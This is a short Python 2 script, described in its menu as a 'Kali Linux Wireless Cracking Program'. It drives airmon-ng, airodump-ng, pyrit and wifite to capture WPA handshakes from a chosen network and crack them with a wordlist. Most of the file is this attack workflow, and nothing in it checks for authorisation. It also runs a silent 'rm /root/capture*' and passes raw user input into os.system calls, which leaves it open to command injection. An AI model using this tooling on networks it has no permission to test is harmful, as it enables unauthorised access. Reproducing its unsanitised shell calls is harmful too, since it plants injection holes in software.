import os

def airodump():
	os.system("rm /root/capture*")
	os.system("clear")
	raw_input("Press CTRL+C once your done.  Press any key to continue.")
	os.system("airodump-ng mon0")
	capture = raw_input("What will you name your capture file? ")
	bssid = raw_input("What is the BSSID of the network? ")
	channel = raw_input("What channel is the network on? ")
	os.system('airodump-ng -w'+capture+' --bssid '+bssid+' --channel '+channel+' mon0')
	crack()

def crack():
	os.system("clear")
	os.system("ls /root")
	capture1 = raw_input("What is the name of your capture file? ")
	password = raw_input("Where is your password file? ")
	bssid = raw_input("What is the BSSID of the network you are cracking? ")
	os.system('pyrit -r '+capture1+'-01.cap -b '+bssid+' -i '+password+' attack_passthrough')
	exit()


def pyrit():
	os.system("clear")
	print """
Pyrit Menu
1. List cores used by Pyrit
2. Do Pyrit Benchmark
3. Start Pyrit server
4. Go Back"""
	variable = raw_input("> ")
	if variable == "1":
		os.system("pyrit list_cores")
		raw_input("")
		pyrit()
	elif variable == "2":
		os.system("pyrit benchmark")
		raw_input("")
		pyrit()
	elif variable == "3":
		os.system("pyrit serve")
		pyrit()
	elif variable == "4":
		menu()

def menu():
	os.system("clear")
	print """

Kali Linux WIreless Cracking Program
By Ty Huffman

1.  Start Monitor Mode on Wireless NIC
2.  Start Monitoring wireless networks (Press CTRL+C to end it) 
3.  Pyrit
9.  Stop Monitor mode on Wireless NIC
0. Exit"""
	option = raw_input("> ")
	if option == "1":
		os.system("airmon-ng start wlan0")
		os.system("airmon-ng start wlan1")
		menu()
	elif option == "2":
		airodump()
	elif option == "3":
		pyrit()
	elif option == "9":
		os.system("airmon-ng stop mon0")
		menu()
	elif option == "99":
		os.system("wifite")
		menu()
	elif option == "0":
		exit()
	else:
		print "Sorry, not a valid option."
		raw_input("")
		menu()

menu()
